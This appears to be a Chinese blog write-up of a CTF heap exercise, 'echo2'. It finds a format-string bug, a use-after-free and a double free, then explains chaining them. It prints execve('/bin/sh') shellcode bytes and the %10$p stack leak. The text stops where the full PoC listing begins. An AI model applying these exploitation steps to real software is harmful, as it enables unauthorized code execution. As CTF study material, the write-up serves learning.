@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n" />
+
+  <!-- 搜索引擎摘要：优先页面自定义 description / excerpt / 正文前 160 字，最后回落到站点 description -->
+  
+  
+    <meta name="description" content="fmtstr_uaf 可执行文件为： echo2 ，尝试执行。 检查文件的安全检测。发现什么安全防护都没开。 反编译 使用IDA Pro进行反编译。 按 “\” 键，可以消除变量的类型，更简洁。 对于反编译的代码中，注意到有 (_QWORD *) ，这是什么？表示指针，除此之外，还有 _BYTE 表示1字节， _WOR…" />
+  
+  
+    <meta name="keywords" content="X2n,Web安全,漏洞挖掘,渗透测试,SRC,内网渗透,Kubernetes 安全,云安全,安全研究,技术博客" />
+  
+
+  
+  
+  <title>
+    
+      二进制堆的练习题 
+      
+      
+      |
+    
+     Keep your passion for what you love !
+  </title>
+
+  
+
+  <!-- Canonical URL：避免重复内容降权 -->
+  <link rel="canonical" href="https://x2nn.github.io/2026/02/28/二进制堆的练习题/" />
+
+  <!-- Open Graph (Facebook / 微信 / 飞书 / LinkedIn) -->
+  <meta property="og:site_name" content="Keep your passion for what you love !" />
+  <meta property="og:title" content="二进制堆的练习题 | Keep your passion for what you love !" />
+  
+    <meta property="og:description" content="fmtstr_uaf 可执行文件为： echo2 ，尝试执行。 检查文件的安全检测。发现什么安全防护都没开。 反编译 使用IDA Pro进行反编译。 按 “\” 键，可以消除变量的类型，更简洁。 对于反编译的代码中，注意到有 (_QWORD *) ，这是什么？表示指针，除此之外，还有 _BYTE 表示1字节， _WOR…" />
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://x2nn.github.io/2026/02/28/二进制堆的练习题/" />
+  <meta property="og:image" content="https://x2nn.github.io/images/avatar.png" />
+  <meta property="og:locale" content="zh_CN" />
+  
+    
+      <meta property="article:published_time" content="2026-02-28T08:16:19.000Z" />
+    
+    
+      <meta property="article:modified_time" content="2026-03-17T09:27:50.435Z" />
+    
+    
+      <meta property="article:tag" content="heap Overflow" />
+    
+      <meta property="article:tag" content="bins" />
+    
+      <meta property="article:tag" content="UAF" />
+    
+  
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="二进制堆的练习题 | Keep your passion for what you love !" />
+  
+    <meta name="twitter:description" content="fmtstr_uaf 可执行文件为： echo2 ，尝试执行。 检查文件的安全检测。发现什么安全防护都没开。 反编译 使用IDA Pro进行反编译。 按 “\” 键，可以消除变量的类型，更简洁。 对于反编译的代码中，注意到有 (_QWORD *) ，这是什么？表示指针，除此之外，还有 _BYTE 表示1字节， _WOR…" />
+  
+  <meta name="twitter:image" content="https://x2nn.github.io/images/avatar.png" />
+
+  <!-- RSS 订阅：浏览器与阅读器可自动发现 -->
+  <link rel="alternate" type="application/atom+xml" title="Keep your passion for what you love ! Atom Feed" href="/atom.xml" />
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+  
+<script src="/js/progressBar.js"></script>
+
+  
+<script src="/js/headerlinkCopy.js"></script>
+
+
+  
+
+  
+
+  <!-- Cloudflare Web Analytics（零 cookie、隐私友好） -->
+  
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js"
+            data-cf-beacon='{"token": "1e1fd0957b6d4ca8a09a54a598b7b525"}'></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="" loading="lazy" decoding="async">
+      
+    </a>
+    <div class="nickname"><a href="/"></a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/collections/">
+          <a href="/collections/">Collections</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">二进制堆的练习题</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-03-17 17:27:50
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/heap-Overflow/" title="heap Overflow">
+                    #heap Overflow
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/bins/" title="bins">
+                    #bins
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/UAF/" title="UAF">
+                    #UAF
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CTF/" title="CTF">
+                    <b>#</b> CTF
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="fmtstr_uaf" tabindex="-1"><a class="headerlink" href="#fmtstr_uaf" aria-hidden="true"></a> fmtstr_uaf</h2>
+<p>可执行文件为：<code>echo2</code>，尝试执行。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260228171054793.png" alt="image-20260228171054793" loading="lazy" decoding="async"></p>
+<p>检查文件的安全检测。发现什么安全防护都没开。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260228171134019.png" alt="image-20260228171134019" loading="lazy" decoding="async"></p>
+<h3 id="反编译" tabindex="-1"><a class="headerlink" href="#反编译" aria-hidden="true"></a> 反编译</h3>
+<p>使用IDA Pro进行反编译。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260228171501856.png" alt="image-20260228171501856" loading="lazy" decoding="async"></p>
+<p>按 “\” 键，可以消除变量的类型，更简洁。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260228171600371.png" alt="image-20260228171600371" loading="lazy" decoding="async"></p>
+<p>对于反编译的代码中，注意到有<code>(_QWORD *)</code>，这是什么？表示指针，除此之外，还有<code>_BYTE</code>表示1字节，<code>_WORD</code>表示两字节，<code>_DWORD</code>，表示<code>Double WORD</code>，两倍的<code>WORD</code>，就是4字节。那么<code>_QWORD</code>，就是<code>Quad WORD</code>，四倍的<code>WORD</code>，就是8字节。小知识点，简单记一下。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260228172705493.png" alt="image-20260228172705493" loading="lazy" decoding="async"></p>
+<p>这里的，<code>greetings</code>和<code>byebye</code>是函数对应地址，点击即可跳转。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260228172856618.png" alt="image-20260228172856618" loading="lazy" decoding="async"></p>
+<p><code>*(o + 3) = greetings;</code>，相当于是把<code>greetings</code>函数的地址，赋值给 o + 3 * 8 (byte)  地址处的值。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260228173332838.png" alt="image-20260228173332838" loading="lazy" decoding="async"></p>
+<h3 id="漏洞点" tabindex="-1"><a class="headerlink" href="#漏洞点" aria-hidden="true"></a> 漏洞点</h3>
+<p>下面分别看一下<code>echo1</code>、<code>echo2</code>和<code>echo3</code>。</p>
+<p><code>echo1</code>如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">echo1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;not supported&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>echo2</code>如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">echo2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  (*(o + <span class="number">3</span>))(o);</span><br><span class="line">  get_input(format, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  (*(o + <span class="number">4</span>))(o);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>echo3</code>如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">echo3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  (*(o + <span class="number">3</span>))(o);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">040u</span>);</span><br><span class="line">  get_input(s, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  (*(o + <span class="number">4</span>))(o);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显，在<code>echo2</code>中，直接使用了<code> printf(format)</code>，这里存在格式化字符串漏洞。</p>
+<p>在<code>echo2</code>中，先是<code>s = malloc(040u)</code>，然后进行了<code>free(s)</code>，但是没有把<code>s</code>，置空，这里存在<code>UAF</code>漏洞。</p>
+<p>然后再回到我们的<code>main</code>函数中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  o = <span class="built_in">malloc</span>(<span class="number">40u</span>);</span><br><span class="line">  *(o + <span class="number">3</span>) = greetings;</span><br><span class="line">  *(o + <span class="number">4</span>) = byebye;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hey, what&#x27;s your name? : &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%24s&quot;</span>, v6);</span><br><span class="line">  v3 = o;</span><br><span class="line">  *o = v6[<span class="number">0</span>];</span><br><span class="line">  v3[<span class="number">1</span>] = v6[<span class="number">1</span>];</span><br><span class="line">  v3[<span class="number">2</span>] = v6[<span class="number">2</span>];</span><br><span class="line">  id = v6[<span class="number">0</span>];</span><br><span class="line">  getchar();</span><br><span class="line">  func[<span class="number">0</span>] = echo1;</span><br><span class="line">  func_1_ = echo2;</span><br><span class="line">  func_2_ = echo3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">121</span>; i = getchar() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n- select echo type -&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;- 1. : BOF echo&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;- 2. : FSB echo&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;- 3. : UAF echo&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;- 4. : exit&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">3</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        (func[i - <span class="number">1</span>])();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid menu&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cleanup(); <span class="comment">//漏洞点,double free</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Are you sure you want to exit? (y/n)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>注意到<code>main</code>函数中存在一个<code>cleanup()</code>函数，函数内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cleanup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(o);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>问题就来了，先执行了<code>cleanup</code>函数，然后再进行判断<code>printf(&quot;Are you sure you want to exit? (y/n)&quot;);</code>，是否进行退出。如果不退出呢？不退出已经<code>free(o)</code>一次，到下一轮，会再<code>free(o)</code>一次，这就造成了<code>double free</code>漏洞。</p>
+<p>尝试复现，使程序崩溃，如下：</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260302010909009.png" alt="image-20260302010909009" loading="lazy" decoding="async"></p>
+<p>这里就是成功触发了<code>double free</code>，造成了程序的崩溃。</p>
+<p>如何去将格式化字符串漏洞、<code>UAF</code>和<code>double free</code>这三个漏洞串起来，实现获取shell呢？下面就慢慢分析。</p>
+<h3 id="漏洞复现" tabindex="-1"><a class="headerlink" href="#漏洞复现" aria-hidden="true"></a> 漏洞复现</h3>
+<p>代码中的变量大致如下：</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307212124689.png" alt="image-20260307212124689" loading="lazy" decoding="async"></p>
+<p>根据前面的checksec，发现stack是Executable，那么，直接向栈中写入shellcode，然后将返回地址的内容覆盖为shellcode的地址，这种是最简单的获取shell的方法。</p>
+<p>这里scanf，输入24个字节，直接写入shellcode。shellcode存储到了v6地址处。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260305152624896.png" alt="image-20260305152624896" loading="lazy" decoding="async"></p>
+<p>低于24字节的shellcode。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="泄露shellcode的真实地址" tabindex="-1"><a class="headerlink" href="#泄露shellcode的真实地址" aria-hidden="true"></a> 泄露shellcode的真实地址</h4>
+<p>如何知道<code>v6</code>的真实地址是什么呢？这里就需要用到前面的格式化字符串漏洞<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>了，使用该漏洞去泄露shellcode的真实地址。</p>
+<p>函数调用栈大致如下：</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307164845127.png" alt="image-20260307164845127" loading="lazy" decoding="async"></p>
+<p>main函数调用了echo2函数，echo2函数中存在格式化字符串漏洞，可泄露写入的shellcode地址。</p>
+<p>现在的想法是，使用格式化字符串漏洞，就是上图中的<code>format</code>位置，去泄露<code>prev ebp</code>的内容，我们就可以拿到了ebp的地址，通过这个ebp去定位shellcode的真实地址。使用IDA Pro进行反编译的时候，这里已经标记了，<code>v6</code>也就是shellcode写入的地址在<code>rbp - 20h</code>位置，这样就可以定位到shellcode的地址了。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307161220511.png" alt="image-20260307161220511" loading="lazy" decoding="async"></p>
+<p>那么怎么通过格式化字符串漏洞，恰好输出，<code>prev ebp</code>的内容呢？下面尝试gdb进行动态调试观察。</p>
+<p>断点<code>b echo2</code>，输入2进入到<code>echo2</code>函数中。这里我为了方便定位输入了<code>AAAAAA</code>，这个<code>AAAAAA</code>就是前面的shellcode的位置。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307161631455.png" alt="image-20260307161631455" loading="lazy" decoding="async"></p>
+<p>然后继续调试，进入到<code>echo2</code>函数中。<code>get_input</code>函数中，我输入了<code>BBBBBB</code>进行定位，这里就是格式化字符串漏洞输入点的位置。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307162044655.png" alt="image-20260307162044655" loading="lazy" decoding="async"></p>
+<p>这时候，我们去看栈中的内容，<code>stack 20</code>。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307162341975.png" alt="image-20260307162341975" loading="lazy" decoding="async"></p>
+<p>这里看<code>AAAAAA</code>这是前面的shellcode的位置，<code>BBBBBB</code>是格式化字符串漏的位置。</p>
+<p>这里的<code>0x7fffffffdd00</code>就是前面图中画的<code>rbp</code>的地址，然后<code>0x7fffffffdcc0</code>就是前面图中画的<code>prev rbp</code>的地址，<code>0x7fffffffdce0</code>就是变量<code>v6</code>的地址，其内容就是<code>AAAAAA</code>，也就是前面图中的shellcode的地址，<code>0x7fffffffdca0</code>就是前面图中的<code>format</code>地址，格式化字符串漏洞的位置。这里的<code>0x7fffffffdd00</code>就是前面图中画的<code>rbp</code>的地址，和<code>0x7fffffffdce0</code>前面图中画的<code>shellcode</code>的地址之间，刚好差了<code>0x7fffffffdd00 - 0x7fffffffdce0 = 0x20</code>，这里就和IDA Pro反编译的<code>rbp - 20h</code>完全符合。</p>
+<p>现在，我想要知道<code>prev rbp</code>的真实地址，发现其与<code>format</code>之间差了4个参数的位置，我们知道在x86-64架构中，<code>printf</code>优先输出的参数内容是先从6个默认的寄存器<code>rdi, rsi, rdx, rcx, r8, r9</code>，然后才是输出栈中的变量，栈中是4个变量的位置，那么通过<code>printf(%10$p)</code>，即可输出<code>prev rbp</code>地址中的真实内容，这个内容也就是<code>rbp</code>的真实地址，使用<code>rbp</code>的真实地址减去<code>0x20</code>，即可确定了<code>shellcode</code>的地址。</p>
+<h4 id="返回地址的篡改" tabindex="-1"><a class="headerlink" href="#返回地址的篡改" aria-hidden="true"></a> 返回地址的篡改</h4>
+<p>目前<code>shellcode</code>的地址已经可以获取到了，如何将<code>shellcode</code>写到返回地址中？</p>
+<p>仔细查看IDA Pro反编译的结果，发现其实只需要用到<code>UAF</code>就可以实现返回地址的篡改了。</p>
+<p>注意到<code>main</code>函数中的<code>cleanup()</code>函数，该函数为<code>free(o)</code>，在输入的时候，输入<code>4</code>，直接执行<code>cleanup()</code>，这里只是<code>free</code>了<code>o</code>。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307203158829.png" alt="image-20260307203158829" loading="lazy" decoding="async"></p>
+<p>此时进入了下一个循环，我们输入<code>3</code>，进入到<code>echo3</code>函数中，如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">echo3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  (*(o + <span class="number">3</span>))(o);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x20u</span>);</span><br><span class="line">  <span class="built_in">get_input</span>(s, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  (*(o + <span class="number">4</span>))(o);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>echo3()</code>中<code>(*(o + 3))(o);</code>，其实就是调用了<code>greetings</code>函数，然后又<code>malloc(0x20u);</code>一个变量<code>s</code>。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307205349924.png" alt="image-20260307205349924" loading="lazy" decoding="async"></p>
+<p>我使用的Ubuntu版本使用的是glibc 2.35，对于<code>free</code>掉的<code>chunk</code>会在<code>tcache</code>中，这时候又malloc了一个<code>0x20</code>的内存，根据<code>tcache</code>的LIFO（Last In First Out）策略，对于新malloc的<code>s</code>，会复用原来的<code>o</code>的部分位置。注意，上图中只是<code>o</code>这个地址里的内容为<code>v6[0]</code>，其并不影响原来的变量<code>v6</code>。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307212714587.png" alt="image-20260307212714587" loading="lazy" decoding="async"></p>
+<p>那么这里突破点就来了，可以通过覆盖<code>greetings</code>函数的返回地址，为<code>shellcode</code>的地址，然后再调用<code>greetings</code>函数，就可以获取<code>shell</code>了。</p>
+<p><code>s = malloc(0x20u);</code>的下一个就是输入<code> get_input(s, 32);</code>，这里直接输入随机字符，覆盖<code>o、o+1、o+2</code>位置的值，然后再输入<code>shellcode</code>的地址，覆盖<code>greetings</code>的地址，也就是输入，24个字节+shellcode地址。</p>
+<h4 id="漏洞触发" tabindex="-1"><a class="headerlink" href="#漏洞触发" aria-hidden="true"></a> 漏洞触发</h4>
+<p>执行到下一轮之后，随机选择一个<code>echo2</code>或者<code>echo3</code>都可以触发shellcode。</p>
+<p><img src="/2026/02/28/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%A0%86%E7%9A%84%E7%BB%83%E4%B9%A0%E9%A2%98/image-20260307213642626.png" alt="image-20260307213642626" loading="lazy" decoding="async"></p>
+<p>完整的poc如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 